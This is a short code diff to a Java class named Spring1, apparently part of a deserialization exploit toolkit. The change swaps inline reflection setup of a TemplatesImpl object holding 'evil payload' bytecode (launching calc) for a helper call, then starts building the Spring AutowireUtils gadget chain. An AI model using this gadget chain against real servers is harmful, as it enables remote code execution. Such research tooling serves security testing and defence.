@@ -13,12 +13,7 @@ import java.lang.reflect.Constructor;
 
 public class Spring1 {
     public static void main(String[] args) throws Exception {
-        byte[] bytes = Utils.getEvilPayload("calc");
-        TemplatesImpl templates = new TemplatesImpl();
-        Utils.setValue(templates ,"_name" ,"xxx");
-        Utils.setValue(templates ,"_class" ,null);
-        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
-        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());
+        TemplatesImpl templates = Utils.createTemplatesImpl("calc");
 
         Constructor constructor = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getClass().getDeclaredConstructor(ObjectFactory.class);
         constructor.setAccessible(true);
